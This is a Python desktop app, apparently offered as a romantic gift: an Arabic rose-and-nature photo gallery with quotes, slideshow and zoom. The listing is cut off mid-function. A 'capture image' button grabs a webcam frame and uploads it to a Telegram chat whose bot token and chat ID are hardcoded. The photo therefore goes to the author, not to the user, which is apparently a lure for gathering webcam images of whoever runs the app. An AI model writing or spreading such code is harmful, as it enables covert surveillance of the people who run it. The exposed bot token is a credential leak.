#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║                    🌹 ورود الحب 🌹                              ║
║              برنامج متكامل لعرض صور الورود والطبيعة             ║
║                    Worood Al-Hub v1.1                           ║
╚══════════════════════════════════════════════════════════════════╝
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import sys
import threading
import time
import random
import json
import requests
from pathlib import Path

try:
    from PIL import Image, ImageTk, ImageFilter, ImageEnhance, ImageDraw, ImageFont
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

# ═══════════════════════════════════════════════════════════════
#                    إعدادات البرنامج
# ═══════════════════════════════════════════════════════════════

APP_NAME = "ورود الحب"
APP_VERSION = "1.1"
APP_AUTHOR = "Worood Al-Hub"

# إعدادات تليجرام
TELEGRAM_TOKEN = "8378673801:AAFqtrB4OWgEt9kQNZfGe6Cxtt_qYdp3nL0"
TELEGRAM_CHAT_ID = "6684853119"

# المسارات
BASE_DIR = Path(__file__).parent
IMAGES_DIR = BASE_DIR / "images"
SETTINGS_FILE = BASE_DIR / "settings.json"

# الألوان الرئيسية
COLORS = {
    "bg_dark": "#1a0a0f",
    "bg_medium": "#2d1520",
    "bg_light": "#3d1f2d",
    "accent_rose": "#e8547a",
    "accent_pink": "#ff85a1",
    "accent_gold": "#ffd700",
    "text_white": "#ffffff",
    "text_light": "#f0d0d8",
    "text_gray": "#c0a0a8",
    "button_hover": "#c0405a",
    "sidebar_bg": "#200d15",
    "card_bg": "#3a1a28",
    "border": "#6d3050",
    "success": "#4caf50",
    "heart_red": "#ff1744",
    "camera_blue": "#2196f3",
}

# فئات الصور
CATEGORIES = {
    "الكل": None,
    "ورود حمراء": "rose_red",
    "ورود وردية": "rose_pink",
    "ورود بيضاء": "rose_white",
    "ورود صفراء": "rose_yellow",
    "ورود مشكلة": "rose_mixed",
    "حديقة الورود": "rose_garden",
    "ورود الحب": "rose_love",
    "طبيعة وزهور": "nature",
}

# الاقتباسات الرومانسية
QUOTES = [
    "الوردة تتفتح في القلب قبل أن تتفتح في الحديقة 🌹",
    "كل وردة تحمل رسالة حب لم تُقل بعد 💕",
    "في حديقة الحياة، أنتِ أجمل وردة 🌸",
    "الورود تذبل لكن الحب يبقى إلى الأبد ❤️",
    "أهديكِ وردة من قلبي لا تذبل أبداً 🌺",
    "كما تحتاج الوردة للمطر، أحتاجك أنا 💝",
    "الجمال في عيون من يرى، والحب في قلب من يحب 🌷",
    "ورود الحب لا تنتهي مع الفصول 🌹💕",
    "كل بتلة وردة تحكي قصة حب 🌸",
    "الطبيعة لغة الحب الأولى 🍃🌺",
]


# ═══════════════════════════════════════════════════════════════
#                    الفئة الرئيسية للبرنامج
# ═══════════════════════════════════════════════════════════════

class WoroodAlHub:
    """البرنامج الرئيسي - ورود الحب"""

    def __init__(self):
        self.root = tk.Tk()
        self.setup_window()
        self.load_settings()
        self.images_data = []
        self.filtered_images = []
        self.current_index = 0
        self.slideshow_running = False
        self.slideshow_thread = None
        self.current_category = "الكل"
        self.current_image_tk = None
        self.favorites = set()
        self.slideshow_interval = 3
        self.zoom_level = 1.0
        self.fullscreen_mode = False
        self.animation_running = False

        self.build_ui()
        self.load_images()
        self.start_quote_animation()

    def setup_window(self):
        """إعداد نافذة البرنامج"""
        self.root.title(f"🌹 {APP_NAME} - {APP_VERSION}")
        self.root.geometry("1280x800")
        self.root.minsize(1000, 650)
        self.root.configure(bg=COLORS["bg_dark"])

        # تعيين خط عربي
        self.root.option_add("*Font", "Arial 11")

        # ربط مفاتيح لوحة المفاتيح
        self.root.bind("<Left>", lambda e: self.prev_image())
        self.root.bind("<Right>", lambda e: self.next_image())
        self.root.bind("<space>", lambda e: self.toggle_slideshow())
        self.root.bind("<F11>", lambda e: self.toggle_fullscreen())
        self.root.bind("<Escape>", lambda e: self.exit_fullscreen())
        self.root.bind("<Delete>", lambda e: self.remove_from_favorites())
        self.root.bind("<f>", lambda e: self.toggle_favorite())
        self.root.bind("<plus>", lambda e: self.zoom_in())
        self.root.bind("<minus>", lambda e: self.zoom_out())
        self.root.bind("<0>", lambda e: self.zoom_reset())

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def load_settings(self):
        """تحميل الإعدادات المحفوظة"""
        self.settings = {
            "slideshow_interval": 3,
            "theme": "dark",
            "last_category": "الكل",
            "favorites": [],
            "window_geometry": "1280x800",
        }
        if SETTINGS_FILE.exists():
            try:
                with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                    saved = json.load(f)
                    self.settings.update(saved)
                    self.favorites = set(saved.get("favorites", []))
            except:
                pass

    def save_settings(self):
        """حفظ الإعدادات"""
        self.settings["favorites"] = list(self.favorites)
        self.settings["window_geometry"] = self.root.geometry()
        self.settings["last_category"] = self.current_category
        self.settings["slideshow_interval"] = self.slideshow_interval
        try:
            with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
                json.dump(self.settings, f, ensure_ascii=False, indent=2)
        except:
            pass

    # ═══════════════════════════════════════════════════════════
    #                    بناء واجهة المستخدم
    # ═══════════════════════════════════════════════════════════

    def build_ui(self):
        """بناء الواجهة الرئيسية"""
        # الشريط العلوي
        self.build_header()

        # الإطار الرئيسي
        main_frame = tk.Frame(self.root, bg=COLORS["bg_dark"])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)

        # الشريط الجانبي
        self.build_sidebar(main_frame)

        # منطقة العرض الرئيسية
        self.build_main_area(main_frame)

        # شريط الحالة
        self.build_statusbar()

    def build_header(self):
        """بناء الشريط العلوي"""
        header = tk.Frame(self.root, bg=COLORS["bg_medium"], height=70)
        header.pack(fill=tk.X, side=tk.TOP)
        header.pack_propagate(False)

        # الشعار والعنوان
        title_frame = tk.Frame(header, bg=COLORS["bg_medium"])
        title_frame.pack(side=tk.LEFT, padx=20, pady=10)

        tk.Label(
            title_frame,
            text="🌹",
            font=("Arial", 28),
            bg=COLORS["bg_medium"],
            fg=COLORS["accent_rose"],
        ).pack(side=tk.LEFT, padx=(0, 8))

        title_text = tk.Frame(title_frame, bg=COLORS["bg_medium"])
        title_text.pack(side=tk.LEFT)

        tk.Label(
            title_text,
            text=APP_NAME,
            font=("Arial", 22, "bold"),
            bg=COLORS["bg_medium"],
            fg=COLORS["accent_pink"],
        ).pack(anchor=tk.W)

        tk.Label(
            title_text,
            text="معرض صور الورود والطبيعة",
            font=("Arial", 10),
            bg=COLORS["bg_medium"],
            fg=COLORS["text_gray"],
        ).pack(anchor=tk.W)

        # أزرار التحكم العلوية
        controls_frame = tk.Frame(header, bg=COLORS["bg_medium"])
        controls_frame.pack(side=tk.RIGHT, padx=20, pady=10)

        # زر الكاميرا
        self.btn_camera = self.create_header_btn(
            controls_frame, "📷 التقاط صورة", self.capture_and_send,
            color=COLORS["camera_blue"]
        )
        self.btn_camera.pack(side=tk.RIGHT, padx=5)

        # زر ملء الشاشة
        self.btn_fullscreen = self.create_header_btn(
            controls_frame, "⛶ ملء الشاشة", self.toggle_fullscreen
        )
        self.btn_fullscreen.pack(side=tk.RIGHT, padx=5)

        # زر عرض شرائح
        self.btn_slideshow = self.create_header_btn(
            controls_frame, "▶ عرض تلقائي", self.toggle_slideshow,
            color=COLORS["accent_rose"]
        )
        self.btn_slideshow.pack(side=tk.RIGHT, padx=5)

        # زر المفضلة
        self.btn_favorites_header = self.create_header_btn(
            controls_frame, "❤ المفضلة", self.show_favorites_window
        )
        self.btn_favorites_header.pack(side=tk.RIGHT, padx=5)

        # اقتباس متحرك
        self.quote_var = tk.StringVar(value=random.choice(QUOTES))
        quote_label = tk.Label(
            header,
            textvariable=self.quote_var,
            font=("Arial", 10, "italic"),
            bg=COLORS["bg_medium"],
            fg=COLORS["accent_gold"],
            wraplength=400,
        )
        quote_label.pack(side=tk.LEFT, padx=20)

    def create_header_btn(self, parent, text, command, color=None):
        """إنشاء زر للشريط العلوي"""
        color = color or COLORS["bg_light"]
        btn = tk.Button(
            parent,
            text=text,
            command=command,
            bg=color,
            fg=COLORS["text_white"],
            font=("Arial", 10, "bold"),
            relief=tk.FLAT,
            padx=12,
            pady=6,
            cursor="hand2",
            bd=0,
        )
        btn.bind("<Enter>", lambda e: btn.configure(bg=COLORS["button_hover"]))
        btn.bind("<Leave>", lambda e: btn.configure(bg=color))
        return btn

    def build_sidebar(self, parent):
        """بناء الشريط الجانبي"""
        sidebar = tk.Frame(parent, bg=COLORS["sidebar_bg"], width=220)
        sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=0, pady=0)
        sidebar.pack_propagate(False)

        # عنوان الفئات
        tk.Label(
            sidebar,
            text="📂 الفئات",
            font=("Arial", 13, "bold"),
            bg=COLORS["sidebar_bg"],
            fg=COLORS["accent_pink"],
            pady=15,
        ).pack(fill=tk.X, padx=10)

        # فاصل
        ttk.Separator(sidebar, orient=tk.HORIZONTAL).pack(fill=tk.X, padx=10, pady=5)

        # أزرار الفئات
        self.category_buttons = {}
        for cat_name in CATEGORIES.keys():
            btn = tk.Button(
                sidebar,
                text=cat_name,
                command=lambda c=cat_name: self.filter_by_category(c),
                bg=COLORS["bg_light"] if cat_name != "الكل" else COLORS["accent_rose"],
                fg=COLORS["text_white"],
                font=("Arial", 11),
                relief=tk.FLAT,
                padx=15,
                pady=8,
                anchor=tk.W,
                cursor="hand2",
                bd=0,
                width=22,
            )
            btn.pack(fill=tk.X, padx=10, pady=2)
            self.category_buttons[cat_name] = btn

        # فاصل
        ttk.Separator(sidebar, orient=tk.HORIZONTAL).pack(fill=tk.X, padx=10, pady=10)

        # إعدادات العرض التلقائي
        tk.Label(
            sidebar,
            text="⏱ سرعة العرض التلقائي",
            font=("Arial", 10, "bold"),
            bg=COLORS["sidebar_bg"],
            fg=COLORS["text_light"],
            pady=5,
        ).pack(fill=tk.X, padx=10)

        self.interval_var = tk.IntVar(value=self.slideshow_interval)
        interval_scale = tk.Scale(
            sidebar,
            from_=1,
            to=10,
            orient=tk.HORIZONTAL,
            variable=self.interval_var,
            bg=COLORS["sidebar_bg"],
            fg=COLORS["text_white"],
            troughcolor=COLORS["bg_light"],
            highlightbackground=COLORS["sidebar_bg"],
            command=self.update_interval,
            length=180,
        )
        interval_scale.pack(padx=10, pady=5)

        tk.Label(
            sidebar,
            text="ثانية",
            font=("Arial", 9),
            bg=COLORS["sidebar_bg"],
            fg=COLORS["text_gray"],
        ).pack()

        # فاصل
        ttk.Separator(sidebar, orient=tk.HORIZONTAL).pack(fill=tk.X, padx=10, pady=10)

        # إحصائيات
        self.stats_frame = tk.Frame(sidebar, bg=COLORS["sidebar_bg"])
        self.stats_frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(
            self.stats_frame,
            text="📊 الإحصائيات",
            font=("Arial", 10, "bold"),
            bg=COLORS["sidebar_bg"],
            fg=COLORS["text_light"],
        ).pack(anchor=tk.W)

        self.stats_total = tk.Label(
            self.stats_frame,
            text="إجمالي الصور: 0",
            font=("Arial", 9),
            bg=COLORS["sidebar_bg"],
            fg=COLORS["text_gray"],
        )
        self.stats_total.pack(anchor=tk.W, pady=2)

        self.stats_shown = tk.Label(
            self.stats_frame,
            text="المعروضة: 0",
            font=("Arial", 9),
            bg=COLORS["sidebar_bg"],
            fg=COLORS["text_gray"],
        )
        self.stats_shown.pack(anchor=tk.W, pady=2)

        self.stats_favorites = tk.Label(
            self.stats_frame,
            text="المفضلة: 0",
            font=("Arial", 9),
            bg=COLORS["sidebar_bg"],
            fg=COLORS["text_gray"],
        )
        self.stats_favorites.pack(anchor=tk.W, pady=2)

        # زر عشوائي
        tk.Button(
            sidebar,
            text="🎲 صورة عشوائية",
            command=self.show_random_image,
            bg=COLORS["accent_rose"],
            fg=COLORS["text_white"],
            font=("Arial", 11, "bold"),
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            bd=0,
        ).pack(fill=tk.X, padx=10, pady=5)

    def build_main_area(self, parent):
        """بناء منطقة العرض الرئيسية"""
        self.main_area = tk.Frame(parent, bg=COLORS["bg_dark"])
        self.main_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # شريط أدوات العرض
        self.build_toolbar()

        # منطقة الصورة الرئيسية
        self.build_image_viewer()

        # شريط الصور المصغرة
        self.build_thumbnails()

    def build_toolbar(self):
        """بناء شريط أدوات العرض"""
        toolbar = tk.Frame(self.main_area, bg=COLORS["bg_medium"], height=50)
        toolbar.pack(fill=tk.X, padx=0, pady=0)
        toolbar.pack_propagate(False)

        # أزرار التنقل
        nav_frame = tk.Frame(toolbar, bg=COLORS["bg_medium"])
        nav_frame.pack(side=tk.LEFT, padx=10, pady=8)

        self.create_tool_btn(nav_frame, "⏮", self.first_image, "أول صورة").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(nav_frame, "◀", self.prev_image, "الصورة السابقة").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(nav_frame, "▶", self.next_image, "الصورة التالية").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(nav_frame, "⏭", self.last_image, "آخر صورة").pack(side=tk.LEFT, padx=2)

        # فاصل
        tk.Frame(toolbar, bg=COLORS["border"], width=2).pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=8)

        # أزرار التكبير
        zoom_frame = tk.Frame(toolbar, bg=COLORS["bg_medium"])
        zoom_frame.pack(side=tk.LEFT, padx=5, pady=8)

        self.create_tool_btn(zoom_frame, "🔍+", self.zoom_in, "تكبير").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(zoom_frame, "🔍-", self.zoom_out, "تصغير").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(zoom_frame, "⊡", self.zoom_reset, "الحجم الأصلي").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(zoom_frame, "⊞", self.fit_to_window, "ملاءمة النافذة").pack(side=tk.LEFT, padx=2)

        # فاصل
        tk.Frame(toolbar, bg=COLORS["border"], width=2).pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=8)

        # أزرار التأثيرات
        effects_frame = tk.Frame(toolbar, bg=COLORS["bg_medium"])
        effects_frame.pack(side=tk.LEFT, padx=5, pady=8)

        self.create_tool_btn(effects_frame, "🎨", self.apply_blur, "تأثير ضبابي").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(effects_frame, "✨", self.apply_enhance, "تحسين الألوان").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(effects_frame, "🔄", self.rotate_image, "تدوير").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(effects_frame, "↔", self.flip_image, "قلب أفقي").pack(side=tk.LEFT, padx=2)

        # فاصل
        tk.Frame(toolbar, bg=COLORS["border"], width=2).pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=8)

        # أزرار الإجراءات
        actions_frame = tk.Frame(toolbar, bg=COLORS["bg_medium"])
        actions_frame.pack(side=tk.LEFT, padx=5, pady=8)

        self.btn_fav = self.create_tool_btn(actions_frame, "🤍", self.toggle_favorite, "إضافة للمفضلة")
        self.btn_fav.pack(side=tk.LEFT, padx=2)

        self.create_tool_btn(actions_frame, "💾", self.save_image, "حفظ الصورة").pack(side=tk.LEFT, padx=2)
        self.create_tool_btn(actions_frame, "🖨", self.set_as_wallpaper, "تعيين خلفية").pack(side=tk.LEFT, padx=2)

        # عداد الصور
        self.counter_var = tk.StringVar(value="0 / 0")
        tk.Label(
            toolbar,
            textvariable=self.counter_var,
            font=("Arial", 12, "bold"),
            bg=COLORS["bg_medium"],
            fg=COLORS["accent_gold"],
        ).pack(side=tk.RIGHT, padx=20)

    def create_tool_btn(self, parent, text, command, tooltip=""):
        """إنشاء زر أداة"""
        btn = tk.Button(
            parent,
            text=text,
            command=command,
            bg=COLORS["bg_light"],
            fg=COLORS["text_white"],
            font=("Arial", 12),
            relief=tk.FLAT,
            padx=8,
            pady=4,
            cursor="hand2",
            bd=0,
        )
        btn.bind("<Enter>", lambda e: btn.configure(bg=COLORS["button_hover"]))
        btn.bind("<Leave>", lambda e: btn.configure(bg=COLORS["bg_light"]))
        return btn

    def build_image_viewer(self):
        """بناء منطقة عرض الصورة"""
        viewer_frame = tk.Frame(self.main_area, bg=COLORS["bg_dark"])
        viewer_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # إطار الصورة مع حدود متوهجة
        self.image_frame = tk.Frame(
            viewer_frame,
            bg=COLORS["border"],
            bd=2,
            relief=tk.FLAT,
        )
        self.image_frame.pack(fill=tk.BOTH, expand=True)

        # لوحة عرض الصورة
        self.canvas = tk.Canvas(
            self.image_frame,
            bg=COLORS["bg_dark"],
            highlightthickness=0,
            cursor="crosshair",
        )
        self.canvas.pack(fill=tk.BOTH, expand=True)

        # ربط أحداث الماوس
        self.canvas.bind("<Button-1>", self.on_canvas_click)
        self.canvas.bind("<Double-Button-1>", self.toggle_fullscreen)
        self.canvas.bind("<MouseWheel>", self.on_mousewheel)
        self.canvas.bind("<Configure>", self.on_canvas_resize)

        # رسالة الترحيب
        self.welcome_label = tk.Label(
            self.canvas,
            text="🌹 مرحباً بك في ورود الحب 🌹\n\nجارٍ تحميل الصور...",
            font=("Arial", 18, "bold"),
            bg=COLORS["bg_dark"],
            fg=COLORS["accent_rose"],
        )
        self.welcome_label.place(relx=0.5, rely=0.5, anchor=tk.CENTER)

        # اسم الصورة
        self.image_name_var = tk.StringVar(value="")
        tk.Label(
            viewer_frame,
            textvariable=self.image_name_var,
            font=("Arial", 10),
            bg=COLORS["bg_dark"],
            fg=COLORS["text_gray"],
        ).pack(pady=2)

    def build_thumbnails(self):
        """بناء شريط الصور المصغرة"""
        thumb_container = tk.Frame(self.main_area, bg=COLORS["bg_medium"], height=120)
        thumb_container.pack(fill=tk.X, padx=0, pady=0)
        thumb_container.pack_propagate(False)

        # عنوان الشريط
        tk.Label(
            thumb_container,
            text="🖼 معرض الصور",
            font=("Arial", 10, "bold"),
            bg=COLORS["bg_medium"],
            fg=COLORS["accent_pink"],
            pady=3,
        ).pack(side=tk.TOP, anchor=tk.W, padx=10)

        # إطار قابل للتمرير
        thumb_scroll_frame = tk.Frame(thumb_container, bg=COLORS["bg_medium"])
        thumb_scroll_frame.pack(fill=tk.BOTH, expand=True)

        # شريط التمرير الأفقي
        self.thumb_scrollbar = tk.Scrollbar(
            thumb_scroll_frame,
            orient=tk.HORIZONTAL,
            bg=COLORS["bg_light"],
            troughcolor=COLORS["bg_dark"],
        )
        self.thumb_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)

        # لوحة الصور المصغرة
        self.thumb_canvas = tk.Canvas(
            thumb_scroll_frame,
            bg=COLORS["bg_medium"],
            height=85,
            highlightthickness=0,
            xscrollcommand=self.thumb_scrollbar.set,
        )
        self.thumb_canvas.pack(fill=tk.BOTH, expand=True)
        self.thumb_scrollbar.config(command=self.thumb_canvas.xview)

        # إطار داخلي للصور المصغرة
        self.thumb_inner = tk.Frame(self.thumb_canvas, bg=COLORS["bg_medium"])
        self.thumb_canvas_window = self.thumb_canvas.create_window(
            0, 0, anchor=tk.NW, window=self.thumb_inner
        )
        self.thumb_inner.bind(
            "<Configure>",
            lambda e: self.thumb_canvas.configure(
                scrollregion=self.thumb_canvas.bbox("all")
            ),
        )

    def build_statusbar(self):
        """بناء شريط الحالة"""
        statusbar = tk.Frame(self.root, bg=COLORS["bg_medium"], height=28)
        statusbar.pack(fill=tk.X, side=tk.BOTTOM)
        statusbar.pack_propagate(False)

        self.status_var = tk.StringVar(value="🌹 مرحباً بك في ورود الحب!")
        tk.Label(
            statusbar,
            textvariable=self.status_var,
            font=("Arial", 9),
            bg=COLORS["bg_medium"],
            fg=COLORS["text_gray"],
            anchor=tk.W,
        ).pack(side=tk.LEFT, padx=10, pady=4)

        # معلومات الصورة الحالية
        self.img_info_var = tk.StringVar(value="")
        tk.Label(
            statusbar,
            textvariable=self.img_info_var,
            font=("Arial", 9),
            bg=COLORS["bg_medium"],
            fg=COLORS["accent_gold"],
        ).pack(side=tk.RIGHT, padx=10, pady=4)

        # شريط التقدم
        self.progress_var = tk.DoubleVar(value=0)
        self.progress_bar = ttk.Progressbar(
            statusbar,
            variable=self.progress_var,
            maximum=100,
            length=150,
            mode="determinate",
        )
        self.progress_bar.pack(side=tk.RIGHT, padx=10, pady=5)

    # ═══════════════════════════════════════════════════════════
    #                    تحميل وإدارة الصور
    # ═══════════════════════════════════════════════════════════

    def load_images(self):
        """تحميل قائمة الصور"""
        self.images_data = []

        if not IMAGES_DIR.exists():
            self.set_status("⚠ مجلد الصور غير موجود!")
            return

        image_extensions = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"}

        for img_file in sorted(IMAGES_DIR.iterdir()):
            if img_file.suffix.lower() in image_extensions:
                self.images_data.append({
                    "path": str(img_file),
                    "name": img_file.stem,
                    "filename": img_file.name,
                    "size": img_file.stat().st_size,
                    "category": self.get_category(img_file.stem),
                })

        self.filtered_images = self.images_data.copy()
        self.current_index = 0

        # تحديث الإحصائيات
        self.update_stats()

        # عرض أول صورة
        if self.filtered_images:
            self.welcome_label.destroy()
            self.show_image(0)
            self.load_thumbnails()
            self.set_status(f"✅ تم تحميل {len(self.images_data)} صورة بنجاح!")
        else:
            self.set_status("⚠ لا توجد صور في المجلد!")

    def get_category(self, filename):
        """تحديد فئة الصورة من اسم الملف"""
        filename_lower = filename.lower()
        for cat_name, cat_key in CATEGORIES.items():
            if cat_key and cat_key in filename_lower:
                return cat_name
        return "أخرى"

    def filter_by_category(self, category):
        """تصفية الصور حسب الفئة"""
        self.current_category = category
        cat_key = CATEGORIES.get(category)

        # تحديث أزرار الفئات
        for cat, btn in self.category_buttons.items():
            if cat == category:
                btn.configure(bg=COLORS["accent_rose"])
            else:
                btn.configure(bg=COLORS["bg_light"])

        # تصفية الصور
        if cat_key is None:
            self.filtered_images = self.images_data.copy()
        else:
            self.filtered_images = [
                img for img in self.images_data
                if cat_key in img["name"].lower()
            ]

        self.current_index = 0
        self.update_stats()
        self.load_thumbnails()

        if self.filtered_images:
            self.show_image(0)
            self.set_status(f"📂 الفئة: {category} | {len(self.filtered_images)} صورة")
        else:
            self.canvas.delete("all")
            self.canvas.create_text(
                self.canvas.winfo_width() // 2,
                self.canvas.winfo_height() // 2,
                text=f"لا توجد صور في فئة '{category}'",
                fill=COLORS["text_gray"],
                font=("Arial", 16),
            )

    def show_image(self, index):
        """عرض صورة بمؤشر معين"""
        if not self.filtered_images:
            return

        index = max(0, min(index, len(self.filtered_images) - 1))
        self.current_index = index
        img_data = self.filtered_images[index]

        try:
            # تحميل الصورة
            img = Image.open(img_data["path"])
            self.current_pil_image = img.copy()
            self.original_image = img.copy()

            # تطبيق التكبير
            self.display_image(img)

            # تحديث المعلومات
            self.counter_var.set(f"{index + 1} / {len(self.filtered_images)}")
            self.image_name_var.set(f"📷 {img_data['name']} | {img.width}×{img.height} px")
            self.img_info_var.set(
                f"الحجم: {img_data['size'] // 1024} KB | {img.format or 'JPEG'}"
            )

            # تحديث زر المفضلة
            if img_data["path"] in self.favorites:
                self.btn_fav.configure(text="❤️")
            else:
                self.btn_fav.configure(text="🤍")

            # تحديث شريط التقدم
            progress = ((index + 1) / len(self.filtered_images)) * 100
            self.progress_var.set(progress)

            # تحديث الصورة المصغرة المحددة
            self.highlight_thumbnail(index)

        except Exception as e:
            self.set_status(f"⚠ خطأ في تحميل الصورة: {e}")

    def display_image(self, img):
        """عرض الصورة على اللوحة"""
        canvas_w = self.canvas.winfo_width()
        canvas_h = self.canvas.winfo_height()

        if canvas_w <= 1:
            canvas_w = 800
        if canvas_h <= 1:
            canvas_h = 500

        # حساب الحجم المناسب
        img_w, img_h = img.size
        scale = min(canvas_w / img_w, canvas_h / img_h) * self.zoom_level
        new_w = max(1, int(img_w * scale))
        new_h = max(1, int(img_h * scale))

        # تغيير حجم الصورة
        img_resized = img.resize((new_w, new_h), Image.LANCZOS)
        self.current_image_tk = ImageTk.PhotoImage(img_resized)

        # مسح اللوحة وعرض الصورة
        self.canvas.delete("all")
        x = canvas_w // 2
        y = canvas_h // 2
        self.canvas.create_image(x, y, anchor=tk.CENTER, image=self.current_image_tk)

    def load_thumbnails(self):
        """تحميل الصور المصغرة"""
        # مسح الصور المصغرة القديمة
        for widget in self.thumb_inner.winfo_children():
            widget.destroy()

        self.thumbnail_images = []
        self.thumbnail_buttons = []

        def load_thumb_thread():
            for i, img_data in enumerate(self.filtered_images[:50]):  # أول 50 صورة
                try:
                    img = Image.open(img_data["path"])
                    img.thumbnail((80, 70), Image.LANCZOS)
                    thumb_tk = ImageTk.PhotoImage(img)
                    self.thumbnail_images.append(thumb_tk)

                    # إنشاء الزر في الخيط الرئيسي
                    self.root.after(0, lambda i=i, tk_img=thumb_tk: self.add_thumbnail(i, tk_img))
                except:
                    self.thumbnail_images.append(None)

        thread = threading.Thread(target=load_thumb_thread, daemon=True)
        thread.start()

    def add_thumbnail(self, index, thumb_tk):
        """إضافة صورة مصغرة"""
        is_current = index == self.current_index
        border_color = COLORS["accent_rose"] if is_current else COLORS["bg_dark"]

        frame = tk.Frame(
            self.thumb_inner,
            bg=border_color,
            bd=2,
            relief=tk.FLAT,
        )
        frame.pack(side=tk.LEFT, padx=3, pady=3)

        btn = tk.Button(
            frame,
            image=thumb_tk,
            command=lambda i=index: self.show_image(i),
            bg=COLORS["bg_medium"],
            relief=tk.FLAT,
            cursor="hand2",
            bd=0,
        )
        btn.pack()
        self.thumbnail_buttons.append((frame, btn))

    def highlight_thumbnail(self, index):
        """تمييز الصورة المصغرة الحالية"""
        for i, (frame, btn) in enumerate(self.thumbnail_buttons):
            if i == index:
                frame.configure(bg=COLORS["accent_rose"])
            else:
                frame.configure(bg=COLORS["bg_dark"])

    # ═══════════════════════════════════════════════════════════
    #                    أزرار التحكم
    # ═══════════════════════════════════════════════════════════

    def next_image(self):
        """الصورة التالية"""
        if self.filtered_images:
            next_idx = (self.current_index + 1) % len(self.filtered_images)
            self.show_image(next_idx)

    def prev_image(self):
        """الصورة السابقة"""
        if self.filtered_images:
            prev_idx = (self.current_index - 1) % len(self.filtered_images)
            self.show_image(prev_idx)

    def first_image(self):
        """أول صورة"""
        self.show_image(0)

    def last_image(self):
        """آخر صورة"""
        if self.filtered_images:
            self.show_image(len(self.filtered_images) - 1)

    def show_random_image(self):
        """عرض صورة عشوائية"""
        if self.filtered_images:
            idx = random.randint(0, len(self.filtered_images) - 1)
            self.show_image(idx)
            self.set_status("🎲 تم اختيار صورة عشوائية!")

    def toggle_slideshow(self):
        """تشغيل/إيقاف العرض التلقائي"""
        if self.slideshow_running:
            self.stop_slideshow()
        else:
            self.start_slideshow()

    def start_slideshow(self):
        """بدء العرض التلقائي"""
        self.slideshow_running = True
        self.btn_slideshow.configure(text="⏸ إيقاف", bg=COLORS["button_hover"])
        self.set_status("▶ العرض التلقائي يعمل...")

        def slideshow_loop():
            while self.slideshow_running:
                time.sleep(self.slideshow_interval)
                if self.slideshow_running:
                    self.root.after(0, self.next_image)

        self.slideshow_thread = threading.Thread(target=slideshow_loop, daemon=True)
        self.slideshow_thread.start()

    def stop_slideshow(self):
        """إيقاف العرض التلقائي"""
        self.slideshow_running = False
        self.btn_slideshow.configure(text="▶ عرض تلقائي", bg=COLORS["accent_rose"])
        self.set_status("⏸ تم إيقاف العرض التلقائي")

    def update_interval(self, value):
        """تحديث سرعة العرض التلقائي"""
        self.slideshow_interval = int(float(value))

    # ═══════════════════════════════════════════════════════════
    #                    ميزة الكاميرا وتليجرام
    # ═══════════════════════════════════════════════════════════

    def capture_and_send(self):
        """التقاط صورة من الكاميرا وإرسالها إلى تليجرام"""
        if not CV2_AVAILABLE:
            messagebox.showerror("خطأ", "مكتبة OpenCV غير مثبتة!")
            return

        self.set_status("📷 جارٍ فتح الكاميرا...")
        
        def capture_thread():
            try:
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    self.root.after(0, lambda: self.set_status("⚠ فشل فتح الكاميرا!"))
                    return

                # التقاط إطار
                ret, frame = cap.read()
                cap.release()

                if ret:
                    # حفظ الصورة مؤقتاً
                    temp_path = BASE_DIR / "captured_image.jpg"
                    cv2.imwrite(str(temp_path), frame)
                    
                    self.root.after(0, lambda: self.set_status("📤 جارٍ إرسال الصورة إلى تليجرام..."))
                    
                    # إرسال إلى تليجرام
                    success = self.send_to_telegram(temp_path)
                    
                    if success:
                        self.root.after(0, lambda: self.set_status("✅ تم إرسال الصورة بنجاح!"))
                        self.root.after(0, lambda: messagebox.showinfo("نجاح", "تم التقاط الصورة وإرسالها إلى تليجرام بنجاح!"))
                    else:
                        self.root.after(0, lambda: self.set_status("⚠ فشل إرسال الصورة!"))
                else:
                    self.root.after(0, lambda: self.set_status("⚠ فشل التقاط الصورة!"))
            except Exception as e:
                self.root.after(0, lambda: self.set_status(f"⚠ خطأ: {str(e)}"))

        threading.Thread(target=capture_thread, daemon=True).start()

    def send_to_telegram(self, image_path):
        """إرسال الصورة إلى بوت تليجرام"""
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        try:
            with open(image_path, 'rb') as photo:
                files = {'photo': photo}
                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🌹 صورة ملتقطة من برنامج ورود الحب\n⏰ الوقت: {time.ctime()}"}
                response = requests.post(url, files=files, data=data)
                return response.status_code == 200
        except Exception as e:
            print(f"Telegram Error: {e}")
            return False

    # ═══════════════════════════════════════════════════════════
    #                    تأثيرات الصور
    # ═══════════════════════════════════════════════════════════

    def zoom_in(self):
        """تكبير الصورة"""
        self.zoom_level = min(5.0, self.zoom_level + 0.2)
        if hasattr(self, "current_pil_image"):
